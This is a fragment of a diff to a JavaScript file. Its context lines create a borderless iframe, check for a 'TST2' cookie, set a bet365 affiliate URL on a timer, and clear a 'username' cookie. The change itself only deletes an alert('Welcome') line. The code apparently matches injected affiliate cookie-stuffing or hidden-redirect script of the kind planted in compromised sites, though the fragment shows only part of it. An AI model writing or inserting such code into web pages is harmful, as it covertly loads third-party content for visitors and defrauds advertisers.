@@ -6,8 +6,7 @@
         ifrm.style.borderStyle = "none";
         document.body.appendChild(ifrm);
  }
- alert('Welcome');
- if (document.cookie.indexOf("TST2") >= 0) {
+if (document.cookie.indexOf("TST2") >= 0) {
     var id0 = 'http://www.bet365.com/home/?affiliate=365_550128';
     var idt0 = 3000;
     document.cookie = "username=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;"; 
